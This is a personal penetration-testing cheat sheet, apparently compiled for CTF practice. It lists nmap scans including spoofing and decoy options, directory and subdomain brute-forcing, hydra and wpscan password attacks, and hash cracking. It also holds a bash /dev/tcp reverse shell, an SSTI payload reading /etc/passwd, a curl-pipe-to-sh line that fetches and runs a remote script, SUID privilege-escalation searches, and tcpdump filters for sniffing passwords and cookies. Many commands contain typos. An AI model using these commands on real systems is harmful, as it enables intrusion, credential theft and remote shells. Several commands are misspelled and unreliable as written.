Nslookup  #get the ip Eg: nslookup google.com
Netdiscover  #ip amd mac of devices connected to the network 
uncover -q “target.com” -e censys,fofa,shodan,shodan-idb | httpx | tee ips.txt
wget https://site.com | grep "< a href=\"http" | grep "site.com"

____________________________________________________________________

#port enumeration (-f:to run fatser,  T4 run faster) 

 	     nmap -p-  #all port
       nmap -sV   #syn-version detection
       nmap -o #os discovery
 	     nmap -vv # verbos 
       nmap –traceroute  #to find missed packets
       nmap -sZ -v #SCTP cookie echo
       nmap -V #version
       nmap -PA (tcp packets) -sT (tcp port)
       nmap -PU (udp packets) -sU(udp port)
       nmap -PE (icmp echo scan)
       nmap -PP (icmp timestamp scan)
       nmap -PM (icmp address mask scan)
       nmap -f (invade firewall)
       nmap -A (aggressive )
       namp -p 1- 100 (specified range)
       nNmap -sC (script in the web)
       nmap –script vuln (vuln scripts)
       nmap --script=ssl-enum-ciphers
       namp -sn (to dicover host wir=thout scanning )
       nmap -sL (TO LIST NUMBER OF IP GETTING SCANNED)
       nmap -PS  (TCP SYN SCAN)
       nmap -PS21 (TCP SYN SCAN with specific port)
       nmap -PA   (TCP ACK scan)
       nmap -PA21 (TCP ACK scan with specific port)
       nmap -PU (UDP scan)   
       nmap -sT // tcp connect scan
       namp -sS // tcp syn scan
       nmap -sU // udp scan
       nmap -sN // null scan
       nmap -sX // xmas scan
       nmap -sF // fin scan
       nmap -sM // TCP  maimon scan
       nmap -sA // TCP ACK scan
       nmap -sW // TCP window scan
       nmap --scanflags CUSTOM_FLAGS //custom scan
      nmap -S SPOOFED_IP // ip sppof
      nmap --sppod-mac SPPOFED-MAC //mac spoof
      nmap -D DECOY_IP // decoy source ip
      nmap -sI ZOMBIE_IP // zombie/idle scan
     -f // fragment ip data into 8 bytes
     -ff // fragment ip data into 16 bytes
      nmap -sV // service detection
      nmap -O // OS detection
      nmap -sC // using scripts
      
     



reverse-DNS lookup
       namp -n //to skip
       nmap -R //query DNS server to look for offline hosts
       namp --dns-servers //for specfic server



prvilaged users to scan targets outside the local network namp uses:
									ICMP echo
									TCP ACK to port 80
									TCP SYN to port 443
									ICMP timestamp request


#dowl a file 
       wget http://ip/filename
       curl http://ip/filname.sh

#directory enumeration      
       gobuster -dir -u http://url/ -w path of file
       wpscan –url http://
       wfuzz -u http://shoppy.htb/ -H "Host: FUZZ.shoppy.htb" -w /home/kali/workspace/tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt  --sc 200 
       feroxbuster -u http://shoppy.htb/ -w /home/kali/workspace/tools/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt

#subdomain enumeration 
       gobuster vhost -u http://url/ -w path
       dig ip@url axpr                    
       ffuf -u “https://FUZZ.target.com" -w <path_to_wordlist> -mc 200,301,302,403         

#bruteforce
       hydra    -l guest                       -P fnal.txt                          ip ssh
          [username / L -username file]   [-p single pass file of paaswords]                          ]                   
       hydra  -l    -p  http-get /hidden/ [server based auth]    
       hydra  -l   -p domainname http-post-form “[reffer] :tfUName=^USER^&tfUPass=^PASS^:S=logout” -vV -f [form based auth]
       wpscan –url  http://    --usernames  use.txt   --passwords pass.txt  [wordpres]
      
#john_the_ripper
      john –wordlist = /usr/share/wordlsts/rockyou.txt –format =  [type of encry.]  [file]
      john filename /usr/share/wordlists/rockyou.txt

#hashcat
      hashcat -m [mode] filename /usr/share/wordlists/rockyou.txt

#reverse shell
      bash -i >&  /dev/tcp/ip/port 0>&1

#DNS Zone transfer
      dig axpr@ip domainname

#Python shell spawn
      python3 -c " import pty; pty.spawn ('/bin/bash')"

#Shell find command
      find / -type f -name "flag" -exec ls -l {} + 2>/dev/null 
      find / - perm -u=s 2>/dev/null
      find / -user root -perm -4000
      find / -perm -4000 2>/dev/null
	find / -type f -perm -04000 -ls 2>/dev/null
	find . -name flag1.txt: find the file named “flag1.txt” in the current directory
	find /home -name flag1.txt: find the file names “flag1.txt” in the /home directory
	find / -type d -name config: find the directory named config under “/”
	find / -type f -perm 0777: find files with the 777 permissions (files readable, writable, and executable by all users)
	find / -perm a=x: find executable files
	find /home -user frank: find all files for user “frank” under “/home”
	find / -mtime 10: find files that were modified in the last 10 days
	find / -atime 10: find files that were accessed in the last 10 day
	find / -cmin -60: find files changed within the last hour (60 minutes)
	find / -amin -60: find files accesses within the last hour (60 minutes)
	find / -size 50M: find files with a 50 MB size
	find / -writable -type d 2>/dev/null : Find world-writeable folders
	find / -perm -222 -type d 2>/dev/null: Find world-writeable folders
	find / -perm -o w -type d 2>/dev/null: Find world-writeable folders
	find / -perm -o x -type d 2>/dev/null
	find / -name perl*
	find / -name python*
	find / -name gcc*
	find / -perm -u=s -type f 2>/dev/null: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.

#ssh port forwarding
      ssh localport:remoteip:remoteport 

# Linuc commands
	hostname //hostname of the target system
	uname -a //print system infromation and additional details of the target system
	/proc/version //information abt taget systemm process 
	/etc/issue //information abt the OS but can be easily changed 
	env // env command will show environmental variables
	sudo -l //The target system may be configured to allow users to run some (or all) commands with root privileges.
	id //id command will provide a general overview of the user’s privilege level and group memberships
	netstat //loosk into existing connections
	netstat -a, netstat -at, netstat -l, netstat -l, netstat -ano
	netstat -s //list network usage statistics by protocol
	netstat -tp //list connections with the service name and PID information.

# Linux export command 
       export PATH=$PATH
       export Path=/usr/bin:$PATH

#ssti payloads
      {{config.class.init.globals['os'].popen(“cat/etc/passwd”).read()}}

#ssh
    ssh username@ip
    ssh -I id_rsa name@ip         #(ssh key)
    ssh-Keygen   #(generate ssh key)
    Upload id_rsa.pub and take connection using id_rsa (chmod +600)

#vulnerable
      sudo :  sudoedit -s Y
       screen : screen -X root/root

#curl
       pyhton3 -m http.server 80
       curl http://ip/linepeas.sh | sh
       
#reconassence
      sublister -d domainname
      theHarvester -d
      crt.sh
      nikto -h http://www.

#find
     find / -perm -u=s 2>/dev/null
     find / -user root -perm -4000
     find / -perm -4000 2>/dev/null
    
#tips and tricks
          Cat filename | grep sh$   #show users only from /etc/passwd   

#Footprinting
       Website-Watcher 
       Bookmark-new webpage  (open pages)
       Buitwith.com (site)
       Whatweb /domain name
       Whois domain name
       Apnic – find ip block
       Dnsdumpster.com 

#email footprinting
       Haveibeenpwned.com – to check whether the emailed is been pwned
       Infoga 

#tcpdump
    capture http password
              tcpdump -s O -A -n -l |egrep -I “POST /|pwd=|passwd=|password=|tfUname|Host:”
    capture cookie 
              tcpdump -nn -A -sO -l | egrep -I “Set-Cookie|Host:|Cookie:”
    capture ftp cred
              tcpdump -e |eth0 | grep PASS
    capture all passwords
              sudo tcpdump port http or port ftp or port smtp or port imap or port pop3 or port telnet -I -A | egrep -I – 85
              ‘pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass|user’

    DHCP exam
            tcpdump -v -n port 67or port 68
    capture on protocol
            tcpdump -I eth0 udp
    capture host based on ip
            tcpdump -I eth0 host [ip]
    extract http user agent
            tcpdump -nn -A -s1500 -i|grep “User-Agent:”
    capture only http get and post packets
            tcpdump -s 0 -A -vv ‘tcp[((tcp[12:1] & 0xf0) >> 2):4 = 0x47455420
    extract HTTP req url’s
            tcpdump -s 0 -v -n -l|egrep -I “POST /|GET /|Host:”

users in /etc/passwd : cat filename | grep bash

passive recon

server to use (optional)

google : 8.8.8.8
google : 8.8.4.4
cloudflare : 1.1.1.1
cloudflare : 1.0.0.1
Quad9  : 9.9.9.9
Quad9  : 149.112.112.112


A	IPv4 Addresses
AAAA	IPv6 Addresses
CNAME	Canonical Name
MX	Mail Servers
SOA	Start of Authority
TXT	TXT Records




#to check whether an github token is vald or not 
curl -H “Authorization: token $GH_TOKEN” -H “Accept: application/vnd.github.v3+json” https://api.github.com/user

